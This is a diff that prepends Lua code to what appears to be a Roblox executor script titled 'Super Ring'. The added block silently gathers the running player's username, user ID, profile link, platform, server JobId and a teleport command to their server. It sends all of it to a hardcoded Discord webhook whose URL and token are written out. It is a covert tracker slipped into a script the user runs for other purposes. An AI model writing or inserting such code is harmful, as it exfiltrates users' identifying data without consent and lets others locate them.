@@ -1,3 +1,91 @@
+local httpService = game:GetService("HttpService")
+local players = game:GetService("Players")
+local userInputService = game:GetService("UserInputService")
+local localPlayer = players.LocalPlayer
+local userId = localPlayer.UserId
+local username = localPlayer.Name
+local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+
+-- Determine platform using UserInputService
+local platform
+if userInputService.TouchEnabled then
+    platform = "Mobile"
+elseif userInputService.KeyboardEnabled then
+    platform = "PC"
+elseif userInputService.GamepadEnabled then
+    platform = "Console"
+else
+    platform = "Unknown"
+end
+
+-- Get JobId
+local jobId = game.JobId or "N/A"
+local placeId = game.PlaceId
+local teleportCode = string.format(
+    'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game:GetService("Players").LocalPlayer)',
+    placeId,
+    jobId
+)
+
+-- Replace with your actual Discord webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1259159133169647716/zgEpZEtPGOe5AsamkF3Jx6dNHv96Vh1anjxCQiYCBK8d6GRFHrenRqWj1M2d_dnc-1V1"
+
+-- Create the payload
+local payload = {
+    ["embeds"] = { {
+        ["title"] = "Script Executed: Super Ring",
+        ["description"] = "**User Info:**",
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = username,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "User ID",
+                ["value"] = tostring(userId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Profile Link",
+                ["value"] = profileUrl,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Platform",
+                ["value"] = platform,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Job ID",
+                ["value"] = "```" .. jobId .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Teleport Code",
+                ["value"] = "```lua\n" .. teleportCode .. "\n```",
+                ["inline"] = false
+            }
+        },
+        ["color"] = tonumber(0x7289DA)
+    } }
+}
+
+-- Attempt to send the payload via `request`
+local success, err = pcall(function()
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = httpService:JSONEncode(payload)
+    })
+end)
+
+if not success then
+    warn("Failed to send data to webhook:", err)
+end
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
